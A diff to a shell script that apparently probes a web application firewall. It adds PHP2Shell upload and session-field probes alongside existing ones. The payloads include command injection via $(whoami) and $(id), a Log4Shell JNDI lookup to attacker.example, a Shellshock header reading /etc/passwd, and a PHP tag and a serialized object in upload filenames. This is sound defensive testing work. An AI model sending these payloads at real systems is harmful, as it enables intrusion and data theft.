@@ -78,6 +78,20 @@ send "CmdInj: \$(whoami)"              GET  "/?host=%24(whoami)"
 send "Log4Shell: JNDI lookup header"   GET  "/" -H 'User-Agent: ${jndi:ldap://attacker.example/a}'
 send "Shellshock header"               GET  "/" -H 'User-Agent: () { :; }; /bin/cat /etc/passwd'
 
+echo "${yellow}# PHP2Shell (CVE-2026-109618/109619, Broadcom KB 460068) indicators${off}"
+echo "${yellow}#   only meaningful against the php2shell demo app (php:8.3.35-apache) - the other${off}"
+echo "${yellow}#   checks above still apply regardless of which app is behind this host${off}"
+# curl's -F can't open a process-substitution path (/dev/fd/N) as upload
+# content - confirmed fails with "Failed to open/read local data" - so this
+# needs a real temp file, just to hold throwaway upload bytes.
+php2shell_upload_body=$(mktemp)
+echo test > "${php2shell_upload_body}"
+send "PHP2Shell: PHPSESSID as POST form field"      POST "/" -d "PHPSESSID=injected"
+send "PHP2Shell: malformed PHP_SESSION_UPLOAD_PROGRESS" POST "/" -d 'PHP_SESSION_UPLOAD_PROGRESS=$(id)'
+send "PHP2Shell: PHP tag in upload filename"        POST "/" -F "file=@${php2shell_upload_body};filename=shell<?php.jpg"
+send "PHP2Shell: serialized object in upload filename" POST "/" -F "file=@${php2shell_upload_body};filename=O:8:\"stdClass\":0:{}.jpg"
+rm -f "${php2shell_upload_body}"
+
 # Disabled: scanner user-agents and probes are not reliably blocked by the WAF policy. Uncomment to re-enable.
 # echo "${yellow}# Scanners / protocol abuse${off}"
 # send "Scanner user-agent (sqlmap)"     GET  "/" -H 'User-Agent: sqlmap/1.7'
